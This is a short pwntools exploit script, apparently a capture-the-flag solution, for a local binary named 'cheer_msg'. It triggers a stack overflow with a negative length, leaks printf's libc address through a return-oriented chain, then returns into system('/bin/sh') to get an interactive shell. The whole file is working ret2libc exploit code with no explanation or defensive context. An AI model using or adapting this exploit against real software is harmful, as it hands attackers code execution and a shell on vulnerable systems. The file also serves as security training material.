#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
#  io = process("./cheer_msg", env = {"LD_PRELOAD": "././libc-2.19.so"})
io = process("./cheer_msg")
elf = ELF("./cheer_msg")
#  libc = ELF("./libc-2.19.so")
libc = elf.libc
context.log_level = "debug"
context.binary = "./cheer_msg"


io.sendlineafter(" >> ", "-100")
#  raw_input("DEBUG: ")
io.sendlineafter(" >> ", flat([cyclic(48), elf.plt['printf'], elf.sym['_start'], elf.got['printf']]))
libc.address = u32(io.recvuntil("\xf7")[-4: ]) - libc.sym['printf']
info("libc: {:#x}".format(libc.address))

io.sendlineafter(" >> ", "-100")
#  raw_input("DEBUG: ")
io.sendlineafter(" >> ", flat([cyclic(48), libc.sym['system'], 'aaaa', next(libc.search("/bin/sh"))]))

io.interactive()
